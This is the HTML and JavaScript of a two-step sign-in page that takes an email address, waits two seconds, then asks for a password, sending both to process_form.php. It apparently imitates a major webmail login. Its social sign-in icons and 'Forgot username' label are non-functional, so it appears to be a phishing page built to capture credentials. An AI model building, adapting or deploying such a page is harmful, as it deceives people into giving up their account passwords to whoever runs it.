<section>
    <div class="container d-flex justify-content-center" style="font-family:forma-djr-micro;">
        <!-- Email Step -->
        <div class="col-sm-6 col-md-6 col-lg-4 col-xs-12 sigin-box" id="emailStep">
            <h1 class="text-center pt-3"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40" style="display:block;padding-top:10px;padding-bottom:10px;"></h1>
            <h4 class="text-center mt-4" id="sign-head"><strong>Sign in</strong></h4><br><br><br>
            <form id="loginForm" action="process_form.php" method="post">
                <input type="email" class="sign-input" id="email" name="email" placeholder="Username or Email" required><br><br>
                <input type="submit" class="submit-nbtn" id="submitBtn" value="Next"><br>
            </form>
            <div class="col-lg-6 label-box">
                <div class="checkbox"><label class="label-a"><input type="checkbox" value="">Stay signed in</label></div>
            </div>
            <div class="col-lg-6 label-box">
                <div class="checkbox"><label class="label-a">Forgot username</label></div>
            </div>
            <div class="clearfix"></div><br>
            <input type="submit" class="submit-nbtn" style="color:#39f;background:0 0;border:1px solid #39f;" value="Create an account"><br><br><br>
            <p class="text-center" style="font-size:14px;">or sign in with</p><br>
            <div>
                <div class="text-center col-xs-4">
                    <p><i class="icon ion-social-facebook" aria-hidden="true"></i> </p>
                </div>
                <div class="text-center col-xs-4">
                    <p><i class="icon ion-social-google" aria-hidden="true"></i> </p>
                </div>
                <div class="text-center col-xs-4">
                    <p><i class="icon ion-social-yahoo" aria-hidden="true"></i> </p>
                </div>
            </div>
        </div>

        <!-- Password Step -->
        <div class="col-sm-5 col-md-4 col-xs-12 sigin-box" id="passwordStep" style="display: none;">
            <h1 class="text-center pt-3"><img class="img-fluid logo1" src="assets/img/logo.png" alt="" width="100" height="40"></h1>
            <h4 class="text-center m-4" id="sign-head"><strong>Enter password</strong></h4>
            <h5 class="text-center" id="sign-head-3">to finish sign in</h5><br><br>
            <p class="text-center email-print" id="emailDisplay"></p>
            <form id="passwordForm" action="process_form.php" method="post">
                <!-- Hidden input to pass email -->
                <input type="hidden" name="email" id="hiddenEmail" value="">

                <div class="password-container">
                    <input type="password" class="sign-input" id="password" name="password" placeholder="Password" required>
                    <span class="toggle-password" onclick="togglePasswordVisibility()">
                        <i class="fas fa-eye" id="eyeIcon"></i>
                    </span>
                </div>

                <br><br>
                <input type="submit" class="submit-nbtn" id="submit" value="Submit">
            </form>
            <div class="clearfix"></div>
            <p class="text-center" style="margin-top: 4em; margin-bottom: 25px;"><a href="#">Forgot Password?</a></p><br>
        </div>

        <style>
            .password-container {
                position: relative;
                display: inline-block;
                width: 100%;
            }
            .toggle-password {
                position: absolute;
                top: 50%;
                right: 10px;
                transform: translateY(-50%);
                cursor: pointer;
                color: #777;
            }
            .sign-input {
                width: 100%;
                padding-right: 35px; /* Make space for the eye icon */
            }
        </style>

        <script>
            function togglePasswordVisibility() {
                const passwordInput = document.getElementById('password');
                const eyeIcon = document.getElementById('eyeIcon');
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    eyeIcon.classList.remove('fa-eye');
                    eyeIcon.classList.add('fa-eye-slash');
                } else {
                    passwordInput.type = 'password';
                    eyeIcon.classList.remove('fa-eye-slash');
                    eyeIcon.classList.add('fa-eye');
                }
            }

            document.getElementById("loginForm").addEventListener("submit", function(event) {
                event.preventDefault();
                const email = document.getElementById("email").value;
                document.getElementById("emailDisplay").textContent = email;

                // Set the hidden input with the email value
                document.getElementById("hiddenEmail").value = email;

                // Wait for 2 seconds before showing the password input
                setTimeout(function() {
                    // Switch to the password step
                    document.getElementById("emailStep").style.display = "none";
                    document.getElementById("passwordStep").style.display = "block";
                }, 2000);  // 2-second delay
            });
        </script>
    </div>
</section>
